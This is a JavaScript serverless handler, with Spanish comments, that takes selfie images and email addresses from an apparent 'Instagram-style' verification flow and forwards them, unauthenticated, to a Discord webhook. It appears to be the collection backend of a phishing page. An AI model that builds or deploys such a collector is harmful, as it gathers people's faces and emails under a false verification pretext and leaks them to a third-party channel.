export const config = {
    runtime: 'edge'
};

export default async function handler(req) {
    if (req.method !== 'POST') {
        return new Response('Method not allowed', { status: 405 });
    }

    const body = await req.json();
    const { type, verificationId, selfieData, email, timestamp, method } = body;

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
        return new Response('Webhook URL not configured', { status: 500 });
    }

    let embed;

    if (type === 'selfie') {
        // Embed estilo Instagram verificación
        embed = {
            title: '🛡️ Nueva Verificación por Selfie',
            color: 0x5865F2,
            fields: [
                {
                    name: '🔖 ID de Verificación',
                    value: `\`${verificationId}\``,
                    inline: true
                },
                {
                    name: '📋 Método',
                    value: method,
                    inline: true
                },
                {
                    name: '📅 Fecha',
                    value: timestamp,
                    inline: true
                },
                {
                    name: '📸 Estado',
                    value: '⏳ Pendiente de revisión',
                    inline: false
                }
            ],
            thumbnail: {
                url: 'https://cdn-icons-png.flaticon.com/512/1077/1077063.png'
            },
            footer: {
                text: 'Sistema de Verificación v1.0'
            },
            timestamp: new Date().toISOString()
        };

        // Enviar embed primero
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: '🛡️ Bot de Verificación',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/1077/1077063.png',
                embeds: [embed]
            })
        });

        // Enviar la selfie como imagen
        if (selfieData) {
            // Convertir base64 a buffer y enviar
            const base64Data = selfieData.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const blob = new Blob([buffer], { type: 'image/jpeg' });

            const formData = new FormData();
            formData.append('file', blob, `selfie-${verificationId}.jpg`);
            formData.append('payload_json', JSON.stringify({
                content: `📸 **Selfie de Verificación** | ID: \`${verificationId}\``
            }));

            await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });
        }

    } else if (type === 'email') {
        embed = {
            title: '📧 Nueva Verificación por Email',
            color: 0x22c55e,
            fields: [
                {
                    name: '🔖 ID de Verificación',
                    value: `\`${verificationId}\``,
                    inline: true
                },
                {
                    name: '📧 Email',
                    value: `\`${email}\``,
                    inline: true
                },
                {
                    name: '📋 Método',
                    value: method,
                    inline: true
                },
                {
                    name: '📅 Fecha',
                    value: timestamp,
                    inline: false
                },
                {
                    name: '✅ Estado',
                    value: '✅ Verificación completada',
                    inline: false
                }
            ],
            thumbnail: {
                url: 'https://cdn-icons-png.flaticon.com/512/732/732200.png'
            },
            footer: {
                text: 'Sistema de Verificación v1.0'
            },
            timestamp: new Date().toISOString()
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: '📧 Bot de Verificación',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/732/732200.png',
                embeds: [embed]
            })
        });
    }

    return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
    });
}
